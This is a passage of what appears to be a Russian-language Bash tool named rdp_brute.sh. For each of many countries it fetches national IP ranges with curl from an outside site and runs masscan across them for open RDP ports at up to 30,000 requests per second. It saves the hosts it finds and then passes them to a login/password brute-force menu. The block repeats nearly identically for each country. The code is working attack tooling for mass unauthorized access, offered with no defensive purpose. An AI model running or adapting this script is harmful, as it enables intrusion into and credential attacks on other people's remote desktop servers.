echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "82" ]; then
curl http://ipdiapazon.16mb.com/Hungary.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "83" ]; then
curl http://ipdiapazon.16mb.com/Iceland.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "84" ]; then
curl http://ipdiapazon.16mb.com/India.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "85" ]; then
curl http://ipdiapazon.16mb.com/Indonesia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "86" ]; then
curl http://ipdiapazon.16mb.com/Iran.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "87" ]; then
curl http://ipdiapazon.16mb.com/Iraq.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "88" ]; then
curl http://ipdiapazon.16mb.com/Ireland.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "89" ]; then
curl http://ipdiapazon.16mb.com/Israel.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "90" ]; then
curl http://ipdiapazon.16mb.com/Italy.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "91" ]; then
curl http://ipdiapazon.16mb.com/Jamaica.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "92" ]; then
curl http://ipdiapazon.16mb.com/Japan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "93" ]; then
curl http://ipdiapazon.16mb.com/Jordan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "94" ]; then
curl http://ipdiapazon.16mb.com/Kazakhstan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "95" ]; then
curl http://ipdiapazon.16mb.com/Kenya.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "96" ]; then
curl http://ipdiapazon.16mb.com/Kiribati.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "97" ]; then
curl http://ipdiapazon.16mb.com/Korea.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "98" ]; then
curl http://ipdiapazon.16mb.com/Kuwait.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "99" ]; then
curl http://ipdiapazon.16mb.com/Kyrgyzstan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
